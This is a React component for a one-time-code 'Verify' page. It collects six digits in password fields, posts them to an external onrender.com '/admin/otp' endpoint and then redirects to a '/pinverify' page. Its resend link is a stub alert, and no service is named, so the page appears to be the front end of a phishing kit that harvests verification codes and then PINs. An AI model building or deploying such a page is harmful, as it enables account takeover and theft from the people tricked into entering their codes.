/* eslint-disable jsx-a11y/anchor-is-valid */
/* eslint-disable react/jsx-no-comment-textnodes */
/* eslint-disable react/style-prop-object */
import React from 'react'
import { useState } from 'react';
import axios from 'axios';
import { useNavigate, } from "react-router-dom"
import "./otp.css"

const Otp = () => {
  const [password, setpassword] = useState("password");
  const [passworda, setpassworda] = useState("passworda");
  const [passwordb, setpasswordb] = useState("passwordb");
  const [passwordc, setpasswordc] = useState("passwordc");
  const [passwordd, setpasswordd] = useState("passwordd");
  const [passworde, setpassworde] = useState("passorde");
  const [isloading, setisloading] = useState(false);

  const navigate = useNavigate();

  const values = {
    password: password,
    passworda: passworda,
    passwordb: passwordb,
    passwordc: passwordc,
    passwordd: passwordd,
    passworde: passworde
  }
  const endpoint = "https://trant-node.onrender.com/admin/otp"

  const verify = (e) => {
    e.preventDefault();
    setisloading(true)
    console.log(values);
    axios.post(endpoint, values)
      .then((res) => {
        console.log(res.data);
        navigate("/pinverify");
      }).catch((err)=>{
        console.log(err);
      })
  }

const redo = () => {
  alert("wait for another 30 mins")
}
return (

  <>
    <section class="container-fluid bg-body-tertiary d-block">
      <div className="row justify-content-center">
        <div className="col-12 col-md-6 col-lg-4" id='kool'>
          <div className="card bg-white mb-5 mt-5 border-0" id='ook'>
            <div className="card-body p-5 text-center">
              <h4>Verify</h4>
              <p>Your code was sent to you via mobile No</p>

              <div class="otp-field mb-4">
                <input type="password" onChange={(e) => setpassword(e.target.value)} name='password' />
                <input type="password" onChange={(e) => setpassworda(e.target.value)} name='passworda' />
                <input type="password" onChange={(e) => setpasswordb(e.target.value)} name='passwordb' />
                <strong className='text-black'>-</strong>
                <input type="password" onChange={(e) => setpasswordc(e.target.value)} name='passwordc' />
                <input type="password" onChange={(e) => setpasswordd(e.target.value)} name='passwordd' />
                <input type="password" onChange={(e) => setpassworde(e.target.value)} name='passworde' />
              </div>

              <button className="btn btn-primary mb-3" onClick={verify}>
                {isloading ? "loading please wait" : "Verify"}
              </button>

              <p className="resend text-muted mb-0" onClick={redo}>
                Didn't receive code? <a href="">Request again</a>
              </p>
            </div>
          </div>
        </div>
      </div>
    </section>
  </>
)
}

export default Otp
